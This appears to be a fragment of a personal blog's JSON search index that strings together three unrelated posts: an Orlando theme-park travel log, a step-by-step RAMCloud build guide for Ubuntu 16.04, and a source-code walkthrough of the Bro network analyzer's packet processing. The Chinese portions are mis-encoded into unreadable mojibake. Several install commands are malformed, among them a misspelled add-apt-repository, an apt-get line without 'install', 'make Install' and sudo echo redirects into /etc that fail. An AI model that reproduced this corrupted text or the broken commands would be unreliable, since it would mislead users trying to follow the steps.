å¦å¤–è¿‡è¿ªæ–¯å°¼çš„APPé¢†å–ä¸‰ä¸ªfast pass, èƒ½å¤Ÿé€‰æ‹©ä¸‰ä¸ªé¡¹ç›®ï¼Œç„¶åæ— éœ€ç­‰å¾…å°±èƒ½å¤Ÿç©é¡¹ç›®ï¼Œä½¿ç”¨å®Œä¸‰ä¸ªFast passä¹‹åå¯ä»¥ç»§ç»­é¢†å–ä¸€ä¸ªfast passï¼Œä½†æ˜¯æœ€å¤šä¸èƒ½å¤Ÿè¶…è¿‡4ä¸ª Fast Pass\né…’åº— æˆ‘ä»¬åœ¨\nåœ°å›¾ Magic Kingdom Maps\nDisney Theme Park Maps\nè¿ªæ–¯å°¼é­”æœ¯ç‹å›½(Disney Magic Kindom)ä¸€å¤©è¡Œç¨‹ é¡¹ç›®æ¸¸ç©å®‰æ’ åœ¨è¿™é‡Œè®°å½•æˆ‘ä»¬äº²è‡ªå»å°è¯•è¿‡çš„é¡¹ç›®\né¡¹ç›® ä»‹ç» æ¨èæŒ‡æ•° Tomorrowland Speedway(Tomorrowland) å›ºå®šçš„å‡ ä¸ªèµ›è½¦é“ï¼Œå¯ä»¥åœ¨é‡Œé¢å¼€èµ›è½¦ï¼Œé€Ÿåº¦å¹¶ä¸æ˜¯å¾ˆå¿«ï¼Œä½†æ˜¯å¯ä»¥åé¢çš„è½¦æ’å‰é¢çš„è½¦ï¼Œè¿™æ˜¯æ¯”è¾ƒçˆ½çš„ 3+ Space Mountain(Tomorrowland) å®¤å†…è¿‡å±±è½¦ï¼Œæ¯”è¾ƒç«çˆ†ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†Fast Pass 4+ Buzz Lightyear\u0026rsquo;s Space Ranger Spin(Tomorrowland) å·´æ–¯å…‰å¹´å°„å‡»æ¸¸æˆ, æ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½ç© 3 Prince Charming Regal Carrousel(Tomorrowland) æ—‹è½¬æœ¨é©¬ 2 Space Mountain(Tomorrowland) å®¤å†…è¿‡å±±è½¦ï¼Œæ¯”è¾ƒç«çˆ†ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†Fast Pass 4+ Buzz Lightyear\u0026rsquo;s Space Ranger Spin(Tomorrowland) å·´æ–¯å…‰å¹´å°„å‡»æ¸¸æˆ, æ„Ÿè§‰ä¸æ˜¯å¾ˆå¥½ç© 3 æ¨èBuzz Lightyear's Space Ranger spin,è¿™æ˜¯ä¸€ä¸ªå°„å‡»ç±»æ¸¸æˆï¼Œä½†æ˜¯ä¸¤ä¸ªäººç©æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„;å¦å¤–Space Mountainéå¸¸åˆºæ¿€ï¼Œè™½ç„¶æ˜¯å®¤å†…è¿‡å±±è½¦ï¼Œä½†æ˜¯æ„Ÿè§‰å¾ˆæ£’ã€‚\nè¿ªæ–¯å°¼æ¨èé¤å… æ ¹æ®è¿™ä¸¤å¤©åœ¨å¤–åƒé¥­çš„ä½“ä¼šï¼Œè¿ªæ–¯å°¼é‡Œé¢é¤å…çš„æ•´ä½“ä»·æ ¼è¿˜ç®—æ¯”è¾ƒæ­£å¸¸ï¼Œå¿«é¤çš„è¯äººå‡èŠ±è´¹å¤§è‡´åœ¨15-25åˆ€ä¸€é¤ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰æå‰é¢„è®¢é¤å…ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½åœ¨é‡Œé¢åƒå¿«é¤äº†ã€‚é¤å…æ¨èï¼š\nç¯çƒå½±åŸ(Day 1) æ¸¸ç©é¡¹ç›®æ¸…å• Universal Studio Florida é¡¹ç›®(ä½ç½®) ä»‹ç» æ¨èæŒ‡æ•° Despicable Me Minion(Production Central) å°é»„äººç”µå½±ï¼Œæ¨èä¸€æ—©è¿›å›­å°±å»çœ‹ï¼Œæ’é˜Ÿçš„äººæ¯”è¾ƒå°‘ 5+ Shrek 4-D å²è±å…‹çš„4Dç”µå½±ï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡æœ‰å°é»„äººç²¾å½© 3 Hollywood rip ride Rocket å¼ºçƒˆæ¨èï¼Œ90åº¦ç›´ä¸Šï¼Œç„¶åè¿ç»­å‡ ä¸ª360åº¦çš„æ—‹è½¬ï¼Œè€Œä¸”å¯ä»¥é€‰æ‹©åœ¨è¿‡å±±è½¦ä¸Šé¢å¬çš„éŸ³ä¹ï¼Œåè¿‡çš„æœ€åˆºæ¿€çš„è¿‡å±±è½¦ 5+ Transformers the Ride-3D å˜å½¢é‡‘åˆšçš„3Dï¼Œéå¸¸çš„ç²¾å½©ï¼Œæ„Ÿè§‰æ˜¯åœ¨å’Œå˜å½¢é‡‘åˆšå…±åŒæˆ˜æ–— 5+ Revenge of the Mummy å®¤å†…è¿‡å±±è½¦é¡¹ç›®ï¼Œæœ¨ä¹ƒä¼Šä¸»é¢˜ï¼Œéå¸¸åˆºæ¿€ï¼Œæ•ˆæœå¾ˆèµ 5 Men in Black alien attack æ‰“å¤–æ˜Ÿäººçš„å°„å‡»ç±»æ¸¸æˆï¼Œä¸ªäººæ„Ÿè§‰ä¸€èˆ¬ï¼Œå’Œè¿ªæ–¯å°¼çš„å·´æ–¯å…‰å¹´ç±»ä¼¼ 3 The Simpsons ride è¾›æ™®æ£®çš„ä¸€å®¶ï¼Œå®¤å†…3D, ä½“éªŒå¾ˆä¸é”™ 5 E.T advanture è‡ªè¡Œè½¦æ¨¡æ ·çš„æ¸¸è§ˆè½¦ï¼Œæ²¡æ„æ€ 3 Islands of Adventure é¡¹ç›®(ä½ç½®) ä»‹ç» æ¨èæŒ‡æ•° The incredible hunk Coaster(Super hero island) ç»¿å·¨äººè¿‡å±±è½¦ï¼Œå¾ˆå–œæ¬¢åˆšå¼€å§‹åŠ é€Ÿå†²å‡ºå»çš„æ„Ÿè§‰ï¼Œå¾ˆåˆºæ¿€ 5+ Stom Force acelatron ååœ¨é‡Œé¢ï¼Œä¸åœè½¬åŠ¨çš„åœ†å½¢æœºå™¨ï¼Œå¤´æ™•ï¼Œæ— èŠ 2 The amazing adventures of spider-man 3Dæ¨¡æ‹Ÿæƒ…æ™¯ç±»ï¼Œè·Ÿç€èœ˜è››ä¾ å„ç§æ‰“æ€ªå…½ 5+ Dudley do-right Ripsaw falls æ¿€æµå‹‡è¿›ï¼Œæœ€åä¸€ä¸‹å¯èƒ½ä¼šæ¹¿è¡£æœï¼Œä½†æ˜¯æ•´ä½“è¿˜è¡Œï¼Œä¸ç”¨å­˜åŒ…ï¼Œè¡£æœä¸ä¼šæ¹¿é€ 5+ Harry potter and the Forbidden journey è¶…çº§ç«çˆ†ï¼Œä¸èƒ½ä½¿ç”¨express,æ¨èè¿›å›­å°±æ¥è¿™é‡Œå…ˆç©è¿™ä¸ª 5 Fight of the hippogriff å°å‹è¿‡å±±è½¦ï¼Œåè¿‡ç»¿å·¨äººä¹‹åï¼Œå°±ä¼šè§‰å¾—è¿™ä¸ªå¾ˆæ— èŠäº† 3 Doctor Doom\u0026rsquo;s fearfall(è·³æ¥¼æœºï¼Œæ²¡æœ‰ç©) åœ¨å®¤å¤–ï¼Œé«˜åº¦æœ‰ç‚¹ææ€–ï¼Œæ²¡æœ‰ç© 5+(åšå®¢æ¨è) ","date":1533822130,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533822130,"objectID":"7ea8f7f1beca86d7a865743c2ad6394a","permalink":"http://www.guozet.me/post/Orlando-travel/","publishdate":"2018-08-09T13:42:10Z","relpermalink":"/post/Orlando-travel/","section":"post","summary":"è¿™æ¬¡å¾ˆæ—©å°±è®¡åˆ’äº†å…«æœˆä»½åˆ°å¥¥å…°å¤šçš„æ—…è¡Œï¼Œæ­£å¥½è¿™æ®µæ—¶é—´æˆ‘åœ¨æš‘æœŸè¯¾ç¨‹å’Œç§‹å­£è¯¾ç¨‹çš„ä¸­é—´ç©ºé—²æ—¶é—´ï¼Œå¥¹ä¹Ÿä½¿ç”¨ä¸¤å¤©ç—…å‡ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å¥¥å…°å¤šæœ‰å®Œæ•´çš„ä¸‰å¤©å¯ä»¥æ¸¸ç©äº†ã€‚\nè¡Œç¨‹å®‰æ’ æˆ‘ä»¬åœ¨å¥¥å…°å¤šçš„æ¸¸ç©æ—¶é—´åªæœ‰ä¸‰å¤©ï¼Œç¬¬ä¸€å¤©æ¸¸ç©è¿ªæ–¯å°¼Magic Kingdom Pack ï¼Œåé¢ä¸¤å¤©æ¸¸ç©Universal Studios \u0026amp; Islands of Adventure ã€‚\næ—¶é—´ è¡Œç¨‹ D1(23:30,08/10) æŠµè¾¾å¥¥å…°å¤šæœºåœº(æˆ‘ä»Atlanta -\u0026gt; Orlando, å¥¹ä»Hartford-\u0026gt;Orlando)) D2(08/11) è¿ªæ–¯å°¼Magic Kingdom Pack D3(08/12) Universal Studios \u0026amp; Islands of Adventure D4(08/13) Universal Studios \u0026amp; Islands of Adventure D5(07:30,08/14) ç¦»å¼€å¥¥å…°å¤š ","tags":"Travel","title":"å¥¥å…°å¤šæ—…è¡Œè®°å½•[3æ—¥]","type":"post"},{"authors":null,"categories":"Network","content":"Introduce RAMCloud is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:\nProject Link: RAMCloud\nOffice Installing introduce: General Information for Developers\nI have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.\nGithub repo Link: RAMCloud For Ubuntu16.04 Bitbucket repo Link: RAMCloud For Ubuntu16.04 If you have some issue with this script, please send email to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.\nInstalling Ramcloud on Ubuntu16.04 Necessary Tools GNU Make (Anything reasonably recent) GNU g++ (4.9.x) git (\u0026gt;= 1.6.0) Perl (Anything reasonably recent) For mergedeps.pl, which automatically inserts included headers in source files into the make dependencies. Python 2.6, epydoc Boost If you\u0026rsquo;re having issues with Boost on Ubuntu, check boost ticket #3844. pcre Doxygen 1.7.1 protocol buffers If you\u0026rsquo;re getting lots of undefined reference errors during linking, it\u0026rsquo;s likely that your libprotobuf is compiled with a different library ABI than RAMCloud. Check GCC\u0026rsquo;s Dual ABI page and the \u0026ldquo;GLIBCXX_USE_CXX11_ABI\u0026rdquo; flag in GNUMakefile. ZooKeeper java and javac (\u0026gt;= 1.7.0_25) If your system is Ubuntu 15.04 or 14.04, then you can just use this command to install these packets in your system.\napt-get install build-essential git-core doxygen=1.7.1 libpcre3-dev protobuf-compiler libprotobuf-dev libcrypto++-dev libevent-dev libboost-all-dev libgtest-dev libzookeeper-mt-dev zookeeper libssl-dev Analyze I can\u0026rsquo;t use this command to work on the Ubuntu 16.04. In addtion, I hope I can use the RAMCloud on any Ubuntu system. It means that it should be worked on Ubuntu 16.04 or 18.04. So I need to compile these packet by g++ or gcc or Cmake.\nInstall Dependency Install build-essential, libssl-dev and git We can get these two libs on Ubuntu 16.06 or 18.04. So we just need to use apt-get to get these lib.\nsudo apt-get -y build-essential libssl-dev git Install gcc/g++ 4.9 The RAMCloud source code used some features in the C++11 Standard. As a result, we need to make sure the gcc/g++ version have support the C++11 Standard. Then we choose the gcc/g++ 4.9 to install. Please follow the commands.\nsudo apt-get install -y software-properties-common sudo add-apt-repositocry -y ppa:ubuntu-toolchain-r/test sudo apt-get update mv /usr/bin/gcc /usr/bin/gcc.bak mv /usr/bin/g++ /usr/bin/g++.bak sudo apt-get install -y gcc-4.9 sudo apt-get install -y g++-4.9 lnif /usr/bin/g++-4.9 /usr/bin/g++ lnif /usr/bin/gcc-4.9 /usr/bin/gcc g++ -v gcc -v If the g++ -v command can output the information like the followed graph. Then it means that you have installed the g++ 4.9 correctly.\nIf the gcc -v command can output the information like the followed graph. Then it means that you have installed the gcc 4.9 correctly.\nYou must to make sure you have installed the gcc and g++ correctly when you want to continue the next steps.\nInstall Java and Javac sudo apt-add-repository -y ppa:webupd8team/java sudo apt-get update install_dependency oracle-java8-installer java -version If the java -version command can output the information like the followed graph. Then it means that you have installed the java correctly.\nInstall Cmake We will use Cmake to compile the Doxygen 1.7.2 in the next steps.\nsudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:george-edison55/cmake-3.x sudo apt-get update sudo apt-get install -y cmake cmake --version Use cmake --version to check the version of cmake. If the cmake --version command can output the informaton like the followed graph. Then it means that you have installed the cmake correctly.\nDownload the packages which will be need in the next few steps. git clone git@bitbucket.org:guozetang/ramcloud.git cd ./ramcloud/packages/ When you get in to this director, you can find these packages in this director. We will use these packages in the next steps.\nInstall Pcre tar -xzvf pcre-8.42.tar.gz cd pcre-8.42 ./configure --prefix=/usr/local/pcre make sudo make install sudo echo \u0026quot;/usr/local/pcre/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/pcre.conf Install Python2.6 tar zxvf Python-2.6.6.tgz cd Python-2.6.6 ./configure --prefix=/usr/local/python2.6 make sudo make install sudo ln -s /usr/local/python2.6/bin/python2.6 /usr/bin/python2.6 -f config_ld_lib /usr/local/python2.6/lib/ /etc/ld.so.conf.d/python2.6.conf python2.6 --version Install Boost tar -xvf boost_1_52_0.tar cd boost_1_52_0 sudo ./bootstrap.sh sudo ./b2 -j sudo ./b2 install --prefix=/usr/local/boost_1_52_0 sudo echo \u0026quot;/usr/local/boost_1_52_0/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/boost_1_52_0.conf Install Doxygen1.7.2 tar -xzvf doxygen.tar.gz cd doxygen cd build cmake -G \u0026quot;Unix Makefiles\u0026quot; .. make sudo make Install Install Protocol Buffers tar -xzvf protobuf-2.6.1.tar.gz cd $CURRENT_DIR/packages/protobuf-2.6.1 ./configure --prefix=/usr/local/protobuf make make check sudo make install sudo echo \u0026quot;/usr/local/protobuf/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/protobuf.conf sudo ln -s /usr/local/protobuf/bin/protoc /usr/bin/protoc -f Install Zookeeper tar -xzvf zookeeper-3.3.6.tar.gz cd zookeeper-3.3.6/src/c ./configure --prefix=/usr/local/zookeeper make sudo make install sudo echo \u0026quot;/usr/local/zookeeper/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/zookeeper.conf This last command sudo echo \u0026quot;/usr/local/zookeeper/lib/\u0026quot; \u0026gt; /etc/ld.so.conf.d/zookeeper.conf can make the other application can find the zookeeper lib in the system.\nConfig the Path Add the include path,library path in the /etc/profile.\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/ export LIBRARY_PATH=$LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/ export C_INCLUDE_PATH=$C_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/ export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/ export PATH=$PATH:/usr/local/pcre/bin/:/usr/local/python2.6/bin/:/usr/local/protobuf/bin/:/usr/local/zookeeper/bin/ export PKG_CONFIG_PATH=:/usr/local/protobuf/lib/pkgconfig/ Install RAMCloud git clone https://github.com/PlatformLab/RAMCloud.git cd RAMCloud make -j12 DEBUG=no ","date":1531654693,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1531654693,"objectID":"fb4113a2c965890b45b1a42f412a372b","permalink":"http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/","publishdate":"2018-07-15T11:38:13Z","relpermalink":"/post/How-to-install-RAMcloud-on-Ubuntu16-04/","section":"post","summary":"Introduce RAMCloud is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:\nProject Link: RAMCloud\nOffice Installing introduce: General Information for Developers\nI have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.\nGithub repo Link: RAMCloud For Ubuntu16.04 Bitbucket repo Link: RAMCloud For Ubuntu16.04 If you have some issue with this script, please send email to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.\n","tags":"Network","title":"How to install RAMcloud on Ubuntu16.04","type":"post"},{"authors":null,"categories":"Network","content":"å‰è¨€ Broæ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„ç½‘ç»œåè®®åˆ†æå™¨ã€‚Broé‡Œé¢çš„Binpacè§£æå™¨å¯ä»¥å¾ˆæ–¹ä¾¿çš„è®©æˆ‘ä»¬ä½¿ç”¨Binpacè¯­è¨€ä¹¦å†™åè®®è§£æå™¨ï¼Œå¹¶é€šè¿‡Binpacè½¬æ¢æˆC++è¯­è¨€ï¼Œè¿™åœ¨ä½¿ç”¨ä¸­èƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦çš„å‡å°‘å¼€å‘æ—¶é—´ï¼Œä¹Ÿå¯ä»¥é¿å…æ‰‹å†™å®¹æ˜“è€ƒè™‘ä¸å…¨çš„é—®é¢˜ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨Binpacä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å»äº†è§£Broåœ¨å¤„ç†ç½‘ç»œæ•°æ®åŒ…çš„æ—¶å€™çš„å¤„ç†æµç¨‹ï¼Œèƒ½å¤Ÿæ–¹ä¾¿æˆ‘ä»¬åœ¨Binpacä½¿ç”¨ä¸­å»æ‰å’ŒBroè€¦åˆçš„éƒ¨åˆ†ï¼Œç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„åè®®è§£æå™¨çš„C++æ–‡ä»¶ã€‚\næºä»£ç é˜…è¯» é‡ç‚¹ï¼šå…³æ³¨äºç½‘ç»œæ•°æ®åŒ…çš„å¤„ç†éƒ¨åˆ†ä»£ç \nBroçš„ç½‘ç»œæ•°æ®åŒ…å¤„ç†æµç¨‹ Broå¯åŠ¨åˆå§‹åŒ–å‡½æ•°main.cc int main(int argc, char** argv) (main.cc)\nåœ¨Broçš„main.ccæ–‡ä»¶é‡Œé¢çš„Mainå‡½æ•°æ˜¯Broå¯åŠ¨è¿‡ç¨‹ä¸­çš„é¦–å…ˆæ‰§è¡Œçš„å‡½æ•°ï¼Œè€Œåœ¨è¿™ä¸ªmainå‡½æ•°é‡Œé¢ï¼Œå’Œæˆ‘ä»¬çš„æ•°æ®åŒ…å¤„ç†éƒ¨åˆ†ç›¸å…³å¯†åˆ‡çš„å‡½æ•°æ˜¯net_run()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªä¸€ç›´å¾ªç¯çš„å‡½æ•°ï¼Œä¸€æ—¦å‡ºæ¥è¿™ä¸ªå‡½æ•°ä¹‹åï¼Œåé¢å·®ä¸å¤šå°±ç»“æŸäº†ã€‚æ¥ä¸‹æ¥é˜…è¯»è¯¥å‡½æ•°ä»£ç ã€‚\næ•°æ®åŒ…å¤„ç†çš„ä¸»è¦å‡½æ•°ï¼š net_run() net_run() (Net.cc)\nvoid net_run() { set_processing_status(\u0026quot;RUNNING\u0026quot;, \u0026quot;net_run\u0026quot;); while ( iosource_mgr-\u0026gt;Size() || (BifConst::exit_only_after_terminate \u0026amp;\u0026amp; ! terminating) ) { double ts; iosource::IOSource* src = iosource_mgr-\u0026gt;FindSoonest(\u0026amp;ts); //æ‰“å¼€ä¹‹åï¼Œè·å–æ‰€ä»¥çš„ç½‘å¡æˆ–è€…æ–‡ä»¶çš„å¥æŸ„ current_iosrc = src; bool communication_enabled = using_communication; if ( src ) //å¦‚æœè¿™ä¸ªå¥æŸ„ä¸æ˜¯ç©ºçš„è¯å°±è¿›å…¥Process()å‡½æ•° src-\u0026gt;Process();\t// which will call net_packet_dispatch() else if ( reading_live \u0026amp;\u0026amp; ! pseudo_realtime) { // live but no source is currently active double ct = current_time(); if ( ! net_is_processing_suspended() ) { net_update_time(ct); expire_timers(); usleep(1); // Just yield. } } else if ( (have_pending_timers || communication_enabled) \u0026amp;\u0026amp; ! pseudo_realtime ) { net_update_time(current_time()); expire_timers(); if ( ! communication_enabled ) usleep(100000); else usleep(1000); mgr.Drain(); processing_start_time = 0.0;\t// = \u0026quot;we're not processing now\u0026quot; current_dispatched = 0; current_iosrc = 0; extern void termination_signal(); if ( signal_val == SIGTERM || signal_val == SIGINT ) termination_signal(); if ( ! reading_traces ) have_pending_timers = timer_mgr-\u0026gt;Size() \u0026gt; 0; } net_get_final_stats(); } è¿™ä¸ªå‡½æ•°å¹¶ä¸æ˜¯å¾ˆé•¿ï¼Œä»”ç»†é˜…è¯»ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬åªéœ€è¦å…³æ³¨å‡½æ•°src-\u0026gt;Process, å…¶ä¸­srcæ˜¯iosource::IOSource* src = iosource_mgr-\u0026gt;FindSoonest(\u0026amp;ts);ç›¸å½“äºå°±æ˜¯æ‰“å¼€æ–‡ä»¶æˆ–è€…ç½‘å¡æ•°æ®çš„å¥æŸ„ï¼ˆæ–‡ä»¶å¥æŸ„æˆ–è€…ç½‘å¡çš„å¥æŸ„ï¼‰ã€‚æ‰€ä»¥å®ƒçš„å¤„ç†å‡½æ•°ä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•°æ®å¤„ç†è¿‡ç¨‹äº†ã€‚\næ¥ä¸‹æ¥çœ‹Processå‡½æ•°,åœ¨è¿™ä¸ªå‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå¤„ç†äº†Packetï¼Œå¤„ç†å®Œä¹‹åï¼Œè°ƒç”¨äº†ä¸€ä¸ªDoneWithPacket()å‡½æ•°ï¼Œä½†æˆ‘ä»¬é‡ç‚¹æ˜¯å…³æ³¨çš„å¤„ç†è¿‡ç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…³æ³¨å‡½æ•°net_packet_dispatch(net_packet_dispatch(current_pseudo, \u0026amp;current_packet, this);),åœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼ å…¥äº†å½“å‰æ•°æ®åŒ…çš„æŒ‡é’ˆã€‚\nvoid Pktsrc::Process() (Pktsrc.cc)\næ¥ä¸‹æ¥é˜…è¯»net_packet_dispatch(current_pseudo, \u0026amp;current_packet, this);çš„å¤„ç†è¿‡ç¨‹ã€‚è¿™ä¸ªå‡½æ•°æ˜¯åœ¨net.ccæ–‡ä»¶ä¸­ï¼Œå’Œnet_run()å‡½æ•°æ˜¯åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚\nvoid net_packet_dispatch(double t, const Packet* pkt, iosource::PktSrc* src_ps) (net.cc)\nåœ¨net_packet_dispatch()å‡½æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªç‰¹åˆ«é‡è¦çš„æ•°æ®ç»“æ„sessions,è¿™æ˜¯åœ¨sessions.ccæ–‡ä»¶ä¸­å®šä¹‰çš„ä¸€ä¸ªå…¨å±€å˜é‡ã€‚\nNetSessions* sessions;\nåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦é˜…è¯»ä¸€ä¸‹ç»“æ„ä½“NetSessions,è¿™ä¸ªç»“æ„ä½“æ˜¯åœ¨sessions.hæ–‡ä»¶ä¸­å®šä¹‰çš„ã€‚åœ¨è¿™ä¸ªç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªç‰¹åˆ«é‡è¦çš„å‡½æ•°NextPacket,è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯åœ¨net_packet_dispatchä¸­è¢«è°ƒç”¨çš„æœ€é‡è¦çš„å‡½æ•°ã€‚\næ¥ä¸‹æ¥é˜…è¯»å…³é”®å‡½æ•°ï¼šNextPacket\nvoid NetSessions::NextPacket(double t, const Packet* pkt) (sessions.cc)\nvoid NetSessions::NextPacket(double t, const Packet* pkt) //tå¯èƒ½æ˜¯æ—¶é—´æˆ³ { SegmentProfiler(segment_logger, \u0026quot;dispatching-packet\u0026quot;); ..... if ( pkt-\u0026gt;hdr_size \u0026gt; pkt-\u0026gt;cap_len ) //å¼€å§‹åˆ¤æ–­åŒ…çš„å¤§å°é—®é¢˜ { Weird(\u0026quot;truncated_link_frame\u0026quot;, pkt); return; } uint32 caplen = pkt-\u0026gt;cap_len - pkt-\u0026gt;hdr_size; //cap_lenæŠ“åˆ°çš„æ•°æ®åŒ…çš„å¤§å°ï¼Œ hdr_size --- IPå¤´é‡Œé¢çš„æ˜¾ç¤ºé•¿åº¦ if ( pkt-\u0026gt;l3_proto == L3_IPV4 ) { if ( caplen \u0026lt; sizeof(struct ip) ) { Weird(\u0026quot;truncated_IP\u0026quot;, pkt); return; } const struct ip* ip = (const struct ip*) (pkt-\u0026gt;data + pkt-\u0026gt;hdr_size); IP_Hdr ip_hdr(ip, false); DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0); } else if ( pkt-\u0026gt;l3_proto == L3_IPV6 ) { ..... DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0); } else if ( pkt-\u0026gt;l3_proto == L3_ARP ) { if ( arp_analyzer ) arp_analyzer-\u0026gt;NextPacket(t, pkt); } ....... if ( dump_this_packet \u0026amp;\u0026amp; ! record_all_packets ) DumpPacket(pkt); } ç»è¿‡åˆ†æï¼Œä¸Šè¿°çš„ä»£ç ä¸­ï¼Œæœ€é‡è¦çš„æ˜¯å‡½æ•°DoNextPacket(t, pkt, \u0026amp;ip_hdr, 0),æŠŠæ•°æ®åŒ…ä¼ å…¥ï¼ŒæŒ‡å‘ipå¤´çš„æŒ‡é’ˆä¼ å…¥ã€‚è¿™ä¸ªå‡½æ•°å¯ä»¥è¯´æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æœ€é‡è¦çš„å‡½æ•°äº†ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå®Œæˆäº†IPå¤´é‡ç»„å·¥ä½œã€‚\nvoid NetSessions::DoNextPacket(double t, const Packet* pkt, const IP_Hdr* ip_hdr, const EncapsulationStack* encapsulation) (Sessions.cc)\nè¿™ä¸ªå‡½æ•°å·²ç»å¼€å§‹å¤„ç†IPæ•°æ®åŒ…äº†,åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢ï¼Œæœ€ä¸»è¦çš„éƒ¨åˆ†æ˜¯å¤„ç†ç‰‡æ®µçš„éƒ¨åˆ†å·¥ä½œï¼š\nå†åˆå§‹åŒ–fä¹‹å‰ï¼Œæ‰§è¡Œäº†ï¼š\nif ( discarder \u0026amp;\u0026amp; discarder-\u0026gt;NextPacket(ip_hdr, len, caplen) ) return; FragReassembler* f = 0; if ( ip_hdr-\u0026gt;IsFragment() ) { dump_this_packet = 1;\t// always record fragments ä¸»è¦çœ‹ä¸€ä¸‹NextPacketå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹: åœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¸»è¦æ£€æŸ¥äº†IPæ•°æ®åŒ…ï¼Œåˆ¤æ–­æ˜¯TCPè¿˜æ˜¯UDPï¼Œç„¶åå¤„ç†IPåµŒå¥—çš„æƒ…å†µã€‚\nint Discarder::NextPacket(const IP_Hdr* ip, int len, int caplen) { int discard_packet = 0; if ( check_ip ) { val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); try { discard_packet = check_ip-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; if ( discard_packet ) return discard_packet; } int proto = ip-\u0026gt;NextProto(); if ( proto != IPPROTO_TCP \u0026amp;\u0026amp; proto != IPPROTO_UDP \u0026amp;\u0026amp; proto != IPPROTO_ICMP ) // This is not a protocol we understand. return 0; // XXX shall we only check the first packet??? if ( ip-\u0026gt;IsFragment() ) // Never check any fragment. return 0; int ip_hdr_len = ip-\u0026gt;HdrLen(); len -= ip_hdr_len;\t// remove IP header caplen -= ip_hdr_len; int is_tcp = (proto == IPPROTO_TCP); int is_udp = (proto == IPPROTO_UDP); int min_hdr_len = is_tcp ? sizeof(struct tcphdr) : (is_udp ? sizeof(struct udphdr) : sizeof(struct icmp)); if ( len \u0026lt; min_hdr_len || caplen \u0026lt; min_hdr_len ) // we don't have a complete protocol header return 0; // Where the data starts - if this is a protocol we know about, // this gets advanced past the transport header. const u_char* data = ip-\u0026gt;Payload(); if ( is_tcp ) { if ( check_tcp ) { const struct tcphdr* tp = (const struct tcphdr*) data; int th_len = tp-\u0026gt;th_off * 4; val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); args-\u0026gt;append(BuildData(data, th_len, len, caplen)); try { discard_packet = check_tcp-\u0026gt;Call(args)-\u0026gt;AsBool(); } catch ( InterpreterException\u0026amp; e ) { discard_packet = false; } delete args; } } else if ( is_udp ) { if ( check_udp ) { const struct udphdr* up = (const struct udphdr*) data; int uh_len = sizeof (struct udphdr); val_list* args = new val_list; args-\u0026gt;append(ip-\u0026gt;BuildPktHdrVal()); 